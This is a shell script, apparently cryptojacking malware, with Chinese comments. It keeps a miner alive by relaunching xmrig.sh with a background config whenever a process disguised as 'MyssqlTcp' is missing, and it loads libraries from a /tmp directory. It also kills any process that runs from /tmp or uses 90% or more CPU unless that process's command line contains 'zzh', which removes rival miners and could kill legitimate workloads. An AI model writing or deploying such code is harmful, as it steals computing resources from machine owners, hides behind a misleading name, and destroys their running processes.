#!/bin/sh

#添加本地执行路径
export LD_LIBRARY_PATH=/tmp/myssqltcp/

while true; do
        #启动一个循环，定时检查进程是否存在
        server=`ps aux | grep MyssqlTcp | grep -v grep`
        if [ ! "$server" ]; then
            #如果不存在就重新启动
            /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
            kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
        ls -l /proc/$procid/exe | grep /tmp
        if [ $? -ne 1 ]
        then
            cat /proc/$procid/cmdline| grep -a -E "zzh"
            if [ $? -ne 0 ]
            then
                kill -9 $procid
            else
                echo "don't kill"
            fi
        fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=90.0) print $1}' | while read procid
    do
        cat /proc/$procid/cmdline| grep -a -E "zzh"
        if [ $? -ne 0 ]
        then
            kill -9 $procid
        else
            echo "don't kill"
        fi
    done
}
kill_sus_proc
            #启动后沉睡10s
            sleep 10
        fi
        #每次循环沉睡10s
        sleep 5
done
